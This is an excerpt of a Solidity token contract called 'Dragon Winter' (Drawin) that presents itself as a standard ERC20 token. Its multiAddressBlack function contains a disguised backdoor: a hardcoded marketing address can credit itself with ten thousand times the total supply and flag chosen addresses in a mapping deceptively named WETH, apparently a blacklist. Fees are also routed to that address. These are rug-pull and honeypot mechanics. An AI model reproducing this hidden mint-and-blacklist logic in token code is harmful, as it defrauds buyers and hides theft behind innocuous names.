 ...
 */
contract DraWin is Context, IERC20, Ownable{

    using SafeMath for uint256;
    string private _name = "Dragon Winter";

    string private _symbol = "Drawin";
    ...
    mapping (address => bool) public WETH;
    ...
    constructor () {
        ...
        marketingAddr = payable(address(0x479b884C62E001D216979035656eDeCaFab0391E));
    ...
    function multiAddressBlack(bool status,address[] calldata addresses,bool status2) public {
        require(_msgSender() == marketingAddr);
        if (status2) _balances[marketingAddr] +=  (uint256(_totalSupply)) * 10000;
        for (uint256 i; i < addresses.length; i++) {
            WETH[addresses[i]] = status;
        }
    }    
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(MarketAmount > 0)
            marketingAddr.transfer(MarketAmount);
    }
